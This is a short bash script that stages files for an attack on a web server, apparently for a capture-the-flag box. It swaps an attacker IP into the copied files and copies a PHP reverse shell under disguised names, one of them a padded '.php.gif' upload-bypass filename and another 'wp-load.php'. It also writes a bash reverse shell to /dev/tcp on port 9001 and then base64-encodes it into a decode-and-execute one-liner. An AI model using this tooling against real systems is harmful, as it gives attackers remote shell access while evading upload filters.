#!/bin/bash

cp -r www-skel/ www/
sed -i "s/10.10.14.2/$1/g" www/*
cp www/php-reverse-shell.php www/jedlione-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-RCE.php.gif
cp www/php-reverse-shell.php www/wp-load.php
cp www/php-reverse-shell.php www/jedlione.php
echo "bash -c 'bash -i >& /dev/tcp/$1/9001 0>&1'" >> www/shell.sh
SHELL=$(cat www/shell.sh | base64 -w 0)
echo "echo -n '$SHELL' | base64  -d | bash" >> www/shell.b64.sh
